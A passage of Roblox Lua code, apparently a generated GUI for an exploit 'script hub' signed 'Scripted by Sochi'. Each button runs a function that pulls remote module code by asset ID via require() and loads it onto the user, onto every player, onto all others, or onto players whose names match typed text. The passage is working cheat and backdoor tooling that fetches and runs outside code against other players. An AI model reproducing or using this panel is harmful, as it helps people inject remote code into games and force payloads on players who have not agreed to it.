TextButton158.Size = UDim2.new(0, 271, 0, 21)
TextButton158.BackgroundColor = BrickColor.new("Really black")
TextButton158.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton158.BackgroundTransparency = 1
TextButton158.BorderColor = BrickColor.new("Really black")
TextButton158.BorderColor3 = Color3.new(0, 0, 0)
TextButton158.ZIndex = 7
TextButton158.Font = Enum.Font.SourceSansSemibold
TextButton158.FontSize = Enum.FontSize.Size14
TextButton158.Text = "Aether Bracelet"
TextButton158.TextColor = BrickColor.new("Institutional white")
TextButton158.TextColor3 = Color3.new(1, 1, 1)
TextButton158.TextSize = 14
TextButton158.TextWrap = true
TextButton158.TextWrapped = true
TextButton158.TextXAlignment = Enum.TextXAlignment.Left
Script159.Parent = TextButton158
table.insert(cors,sandbox(Script159,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4660106429).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4660106429).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4660106429).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4660106429).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel160.Name = "Vertical"
ImageLabel160.Parent = TextButton158
ImageLabel160.Position = UDim2.new(0, -2, 0, 0)
ImageLabel160.Size = UDim2.new(1, 3, 1, 0)
ImageLabel160.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel160.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel160.BackgroundTransparency = 1
ImageLabel160.ZIndex = 3
ImageLabel160.Image = "rbxassetid://3570695787"
ImageLabel160.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel160.ScaleType = Enum.ScaleType.Slice
ImageLabel160.SliceCenter = 100, 100, 100, 100
TextButton161.Name = "Admin"
TextButton161.Parent = ScrollingFrame100
TextButton161.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -676)
TextButton161.Size = UDim2.new(0, 271, 0, 21)
TextButton161.BackgroundColor = BrickColor.new("Really black")
TextButton161.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton161.BackgroundTransparency = 1
TextButton161.BorderColor = BrickColor.new("Really black")
TextButton161.BorderColor3 = Color3.new(0, 0, 0)
TextButton161.ZIndex = 7
TextButton161.Font = Enum.Font.SourceSansSemibold
TextButton161.FontSize = Enum.FontSize.Size14
TextButton161.Text = "Infinity Gauntlet"
TextButton161.TextColor = BrickColor.new("Institutional white")
TextButton161.TextColor3 = Color3.new(1, 1, 1)
TextButton161.TextSize = 14
TextButton161.TextWrap = true
TextButton161.TextWrapped = true
TextButton161.TextXAlignment = Enum.TextXAlignment.Left
Script162.Parent = TextButton161
table.insert(cors,sandbox(Script162,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4622105140).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4622105140).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4622105140).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4622105140).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel163.Name = "Vertical"
ImageLabel163.Parent = TextButton161
ImageLabel163.Position = UDim2.new(0, -2, 0, 0)
ImageLabel163.Size = UDim2.new(1, 3, 1, 0)
ImageLabel163.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel163.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel163.BackgroundTransparency = 1
ImageLabel163.ZIndex = 3
ImageLabel163.Image = "rbxassetid://3570695787"
ImageLabel163.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel163.ScaleType = Enum.ScaleType.Slice
ImageLabel163.SliceCenter = 100, 100, 100, 100
TextButton164.Name = "Admin"
TextButton164.Parent = ScrollingFrame100
TextButton164.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -652)
TextButton164.Size = UDim2.new(0, 271, 0, 21)
TextButton164.BackgroundColor = BrickColor.new("Really black")
TextButton164.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton164.BackgroundTransparency = 1
TextButton164.BorderColor = BrickColor.new("Really black")
TextButton164.BorderColor3 = Color3.new(0, 0, 0)
TextButton164.ZIndex = 7
TextButton164.Font = Enum.Font.SourceSansSemibold
TextButton164.FontSize = Enum.FontSize.Size14
TextButton164.Text = "Big Daddy"
TextButton164.TextColor = BrickColor.new("Institutional white")
TextButton164.TextColor3 = Color3.new(1, 1, 1)
TextButton164.TextSize = 14
TextButton164.TextWrap = true
TextButton164.TextWrapped = true
TextButton164.TextXAlignment = Enum.TextXAlignment.Left
Script165.Parent = TextButton164
table.insert(cors,sandbox(Script165,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4613065404).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4613065404).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4613065404).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4613065404).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel166.Name = "Vertical"
ImageLabel166.Parent = TextButton164
ImageLabel166.Position = UDim2.new(0, -2, 0, 0)
ImageLabel166.Size = UDim2.new(1, 3, 1, 0)
ImageLabel166.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel166.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel166.BackgroundTransparency = 1
ImageLabel166.ZIndex = 3
ImageLabel166.Image = "rbxassetid://3570695787"
ImageLabel166.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel166.ScaleType = Enum.ScaleType.Slice
ImageLabel166.SliceCenter = 100, 100, 100, 100
TextButton167.Name = "Admin"
TextButton167.Parent = ScrollingFrame100
TextButton167.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -628)
TextButton167.Size = UDim2.new(0, 271, 0, 21)
TextButton167.BackgroundColor = BrickColor.new("Really black")
TextButton167.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton167.BackgroundTransparency = 1
TextButton167.BorderColor = BrickColor.new("Really black")
TextButton167.BorderColor3 = Color3.new(0, 0, 0)
TextButton167.ZIndex = 7
TextButton167.Font = Enum.Font.SourceSansSemibold
TextButton167.FontSize = Enum.FontSize.Size14
TextButton167.Text = "Celestial Wheel V2"
TextButton167.TextColor = BrickColor.new("Institutional white")
TextButton167.TextColor3 = Color3.new(1, 1, 1)
TextButton167.TextSize = 14
TextButton167.TextWrap = true
TextButton167.TextWrapped = true
TextButton167.TextXAlignment = Enum.TextXAlignment.Left
Script168.Parent = TextButton167
table.insert(cors,sandbox(Script168,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4660192109).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4660192109).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4660192109).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4660192109).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel169.Name = "Vertical"
ImageLabel169.Parent = TextButton167
ImageLabel169.Position = UDim2.new(0, -2, 0, 0)
ImageLabel169.Size = UDim2.new(1, 3, 1, 0)
ImageLabel169.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel169.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel169.BackgroundTransparency = 1
ImageLabel169.ZIndex = 3
ImageLabel169.Image = "rbxassetid://3570695787"
ImageLabel169.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel169.ScaleType = Enum.ScaleType.Slice
ImageLabel169.SliceCenter = 100, 100, 100, 100
TextButton170.Name = "Admin"
TextButton170.Parent = ScrollingFrame100
TextButton170.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -604)
TextButton170.Size = UDim2.new(0, 271, 0, 21)
TextButton170.BackgroundColor = BrickColor.new("Really black")
TextButton170.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton170.BackgroundTransparency = 1
TextButton170.BorderColor = BrickColor.new("Really black")
TextButton170.BorderColor3 = Color3.new(0, 0, 0)
TextButton170.ZIndex = 7
TextButton170.Font = Enum.Font.SourceSansSemibold
TextButton170.FontSize = Enum.FontSize.Size14
TextButton170.Text = "Pistol"
TextButton170.TextColor = BrickColor.new("Institutional white")
TextButton170.TextColor3 = Color3.new(1, 1, 1)
TextButton170.TextSize = 14
TextButton170.TextWrap = true
TextButton170.TextWrapped = true
TextButton170.TextXAlignment = Enum.TextXAlignment.Left
Script171.Parent = TextButton170
table.insert(cors,sandbox(Script171,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4613117077).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4613117077).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4613117077).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4613117077).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel172.Name = "Vertical"
ImageLabel172.Parent = TextButton170
ImageLabel172.Position = UDim2.new(0, -2, 0, 0)
ImageLabel172.Size = UDim2.new(1, 3, 1, 0)
ImageLabel172.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel172.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel172.BackgroundTransparency = 1
ImageLabel172.ZIndex = 3
ImageLabel172.Image = "rbxassetid://3570695787"
ImageLabel172.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel172.ScaleType = Enum.ScaleType.Slice
ImageLabel172.SliceCenter = 100, 100, 100, 100
TextButton173.Name = "Admin"
TextButton173.Parent = ScrollingFrame100
TextButton173.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -580)
TextButton173.Size = UDim2.new(0, 271, 0, 21)
TextButton173.BackgroundColor = BrickColor.new("Really black")
TextButton173.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton173.BackgroundTransparency = 1
TextButton173.BorderColor = BrickColor.new("Really black")
TextButton173.BorderColor3 = Color3.new(0, 0, 0)
TextButton173.ZIndex = 7
TextButton173.Font = Enum.Font.SourceSansSemibold
TextButton173.FontSize = Enum.FontSize.Size14
TextButton173.Text = "Solaris"
TextButton173.TextColor = BrickColor.new("Institutional white")
TextButton173.TextColor3 = Color3.new(1, 1, 1)
TextButton173.TextSize = 14
TextButton173.TextWrap = true
TextButton173.TextWrapped = true
TextButton173.TextXAlignment = Enum.TextXAlignment.Left
Script174.Parent = TextButton173
table.insert(cors,sandbox(Script174,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4660235055).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4660235055).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4660235055).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4660235055).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel175.Name = "Vertical"
ImageLabel175.Parent = TextButton173
ImageLabel175.Position = UDim2.new(0, -2, 0, 0)
ImageLabel175.Size = UDim2.new(1, 3, 1, 0)
ImageLabel175.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel175.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel175.BackgroundTransparency = 1
ImageLabel175.ZIndex = 3
ImageLabel175.Image = "rbxassetid://3570695787"
ImageLabel175.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel175.ScaleType = Enum.ScaleType.Slice
ImageLabel175.SliceCenter = 100, 100, 100, 100
TextButton176.Name = "Admin"
TextButton176.Parent = ScrollingFrame100
TextButton176.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -556)
TextButton176.Size = UDim2.new(0, 271, 0, 21)
TextButton176.BackgroundColor = BrickColor.new("Really black")
TextButton176.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton176.BackgroundTransparency = 1
TextButton176.BorderColor = BrickColor.new("Really black")
TextButton176.BorderColor3 = Color3.new(0, 0, 0)
TextButton176.ZIndex = 7
TextButton176.Font = Enum.Font.SourceSansSemibold
TextButton176.FontSize = Enum.FontSize.Size14
TextButton176.Text = "Sun"
TextButton176.TextColor = BrickColor.new("Institutional white")
TextButton176.TextColor3 = Color3.new(1, 1, 1)
TextButton176.TextSize = 14
TextButton176.TextWrap = true
TextButton176.TextWrapped = true
TextButton176.TextXAlignment = Enum.TextXAlignment.Left
Script177.Parent = TextButton176
table.insert(cors,sandbox(Script177,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4660273895).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4660273895).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4660273895).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4660273895).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel178.Name = "Vertical"
ImageLabel178.Parent = TextButton176
ImageLabel178.Position = UDim2.new(0, -2, 0, 0)
ImageLabel178.Size = UDim2.new(1, 3, 1, 0)
ImageLabel178.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel178.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel178.BackgroundTransparency = 1
ImageLabel178.ZIndex = 3
ImageLabel178.Image = "rbxassetid://3570695787"
ImageLabel178.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel178.ScaleType = Enum.ScaleType.Slice
ImageLabel178.SliceCenter = 100, 100, 100, 100
TextButton179.Name = "Admin"
TextButton179.Parent = ScrollingFrame100
TextButton179.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -532)
TextButton179.Size = UDim2.new(0, 271, 0, 21)
TextButton179.BackgroundColor = BrickColor.new("Really black")
TextButton179.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton179.BackgroundTransparency = 1
TextButton179.BorderColor = BrickColor.new("Really black")
TextButton179.BorderColor3 = Color3.new(0, 0, 0)
TextButton179.ZIndex = 7
TextButton179.Font = Enum.Font.SourceSansSemibold
TextButton179.FontSize = Enum.FontSize.Size14
TextButton179.Text = "Armstrong Style"
TextButton179.TextColor = BrickColor.new("Institutional white")
TextButton179.TextColor3 = Color3.new(1, 1, 1)
TextButton179.TextSize = 14
TextButton179.TextWrap = true
TextButton179.TextWrapped = true
TextButton179.TextXAlignment = Enum.TextXAlignment.Left
Script180.Parent = TextButton179
table.insert(cors,sandbox(Script180,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4653301778).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4653301778).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4653301778).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4653301778).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel181.Name = "Vertical"
ImageLabel181.Parent = TextButton179
ImageLabel181.Position = UDim2.new(0, -2, 0, 0)
ImageLabel181.Size = UDim2.new(1, 3, 1, 0)
ImageLabel181.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel181.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel181.BackgroundTransparency = 1
ImageLabel181.ZIndex = 3
ImageLabel181.Image = "rbxassetid://3570695787"
ImageLabel181.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel181.ScaleType = Enum.ScaleType.Slice
ImageLabel181.SliceCenter = 100, 100, 100, 100
TextButton182.Name = "Admin"
TextButton182.Parent = ScrollingFrame100
TextButton182.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -508)
TextButton182.Size = UDim2.new(0, 271, 0, 21)
TextButton182.BackgroundColor = BrickColor.new("Really black")
TextButton182.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton182.BackgroundTransparency = 1
TextButton182.BorderColor = BrickColor.new("Really black")
TextButton182.BorderColor3 = Color3.new(0, 0, 0)
TextButton182.ZIndex = 7
TextButton182.Font = Enum.Font.SourceSansSemibold
TextButton182.FontSize = Enum.FontSize.Size14
TextButton182.Text = "Banzai Bazooka"
TextButton182.TextColor = BrickColor.new("Institutional white")
TextButton182.TextColor3 = Color3.new(1, 1, 1)
TextButton182.TextSize = 14
TextButton182.TextWrap = true
TextButton182.TextWrapped = true
TextButton182.TextXAlignment = Enum.TextXAlignment.Left
Script183.Parent = TextButton182
table.insert(cors,sandbox(Script183,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4652801897).BanzaiBazooka(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4652801897).BanzaiBazooka(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4652801897).BanzaiBazooka(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4652801897).BanzaiBazooka(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel184.Name = "Vertical"
ImageLabel184.Parent = TextButton182
ImageLabel184.Position = UDim2.new(0, -2, 0, 0)
ImageLabel184.Size = UDim2.new(1, 3, 1, 0)
ImageLabel184.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel184.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel184.BackgroundTransparency = 1
ImageLabel184.ZIndex = 3
ImageLabel184.Image = "rbxassetid://3570695787"
ImageLabel184.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel184.ScaleType = Enum.ScaleType.Slice
ImageLabel184.SliceCenter = 100, 100, 100, 100
TextButton185.Name = "Admin"
TextButton185.Parent = ScrollingFrame100
TextButton185.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -484)
TextButton185.Size = UDim2.new(0, 271, 0, 21)
TextButton185.BackgroundColor = BrickColor.new("Really black")
TextButton185.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton185.BackgroundTransparency = 1
TextButton185.BorderColor = BrickColor.new("Really black")
TextButton185.BorderColor3 = Color3.new(0, 0, 0)
TextButton185.ZIndex = 7
TextButton185.Font = Enum.Font.SourceSansSemibold
TextButton185.FontSize = Enum.FontSize.Size14
TextButton185.Text = "Goner"
TextButton185.TextColor = BrickColor.new("Institutional white")
TextButton185.TextColor3 = Color3.new(1, 1, 1)
TextButton185.TextSize = 14
TextButton185.TextWrap = true
TextButton185.TextWrapped = true
TextButton185.TextXAlignment = Enum.TextXAlignment.Left
Script186.Parent = TextButton185
table.insert(cors,sandbox(Script186,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4652888609).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4652888609).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4652888609).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4652888609).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel187.Name = "Vertical"
ImageLabel187.Parent = TextButton185
ImageLabel187.Position = UDim2.new(0, -2, 0, 0)
ImageLabel187.Size = UDim2.new(1, 3, 1, 0)
ImageLabel187.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel187.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel187.BackgroundTransparency = 1
ImageLabel187.ZIndex = 3
ImageLabel187.Image = "rbxassetid://3570695787"
ImageLabel187.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel187.ScaleType = Enum.ScaleType.Slice
ImageLabel187.SliceCenter = 100, 100, 100, 100
TextButton188.Name = "Admin"
TextButton188.Parent = ScrollingFrame100
TextButton188.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -460)
TextButton188.Size = UDim2.new(0, 271, 0, 21)
TextButton188.BackgroundColor = BrickColor.new("Really black")
TextButton188.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton188.BackgroundTransparency = 1
TextButton188.BorderColor = BrickColor.new("Really black")
TextButton188.BorderColor3 = Color3.new(0, 0, 0)
TextButton188.ZIndex = 7
TextButton188.Font = Enum.Font.SourceSansSemibold
TextButton188.FontSize = Enum.FontSize.Size14
TextButton188.Text = "Karambit"
TextButton188.TextColor = BrickColor.new("Institutional white")
TextButton188.TextColor3 = Color3.new(1, 1, 1)
TextButton188.TextSize = 14
TextButton188.TextWrap = true
TextButton188.TextWrapped = true
TextButton188.TextXAlignment = Enum.TextXAlignment.Left
Script189.Parent = TextButton188
table.insert(cors,sandbox(Script189,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4652908514).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4652908514).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4652908514).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4652908514).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel190.Name = "Vertical"
ImageLabel190.Parent = TextButton188
ImageLabel190.Position = UDim2.new(0, -2, 0, 0)
ImageLabel190.Size = UDim2.new(1, 3, 1, 0)
ImageLabel190.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel190.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel190.BackgroundTransparency = 1
ImageLabel190.ZIndex = 3
ImageLabel190.Image = "rbxassetid://3570695787"
ImageLabel190.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel190.ScaleType = Enum.ScaleType.Slice
ImageLabel190.SliceCenter = 100, 100, 100, 100
TextButton191.Name = "Admin"
TextButton191.Parent = ScrollingFrame100
TextButton191.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -436)
TextButton191.Size = UDim2.new(0, 271, 0, 21)
TextButton191.BackgroundColor = BrickColor.new("Really black")
TextButton191.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton191.BackgroundTransparency = 1
TextButton191.BorderColor = BrickColor.new("Really black")
TextButton191.BorderColor3 = Color3.new(0, 0, 0)
TextButton191.ZIndex = 7
TextButton191.Font = Enum.Font.SourceSansSemibold
TextButton191.FontSize = Enum.FontSize.Size14
TextButton191.Text = "Neurotic"
TextButton191.TextColor = BrickColor.new("Institutional white")
TextButton191.TextColor3 = Color3.new(1, 1, 1)
TextButton191.TextSize = 14
TextButton191.TextWrap = true
TextButton191.TextWrapped = true
TextButton191.TextXAlignment = Enum.TextXAlignment.Left
Script192.Parent = TextButton191
table.insert(cors,sandbox(Script192,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4653118489).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4653118489).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4653118489).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4653118489).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel193.Name = "Vertical"
ImageLabel193.Parent = TextButton191
ImageLabel193.Position = UDim2.new(0, -2, 0, 0)
ImageLabel193.Size = UDim2.new(1, 3, 1, 0)
ImageLabel193.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel193.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel193.BackgroundTransparency = 1
ImageLabel193.ZIndex = 3
ImageLabel193.Image = "rbxassetid://3570695787"
ImageLabel193.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel193.ScaleType = Enum.ScaleType.Slice
ImageLabel193.SliceCenter = 100, 100, 100, 100
TextButton194.Name = "Admin"
TextButton194.Parent = ScrollingFrame100
TextButton194.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -412)
TextButton194.Size = UDim2.new(0, 271, 0, 21)
TextButton194.BackgroundColor = BrickColor.new("Really black")
TextButton194.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton194.BackgroundTransparency = 1
TextButton194.BorderColor = BrickColor.new("Really black")
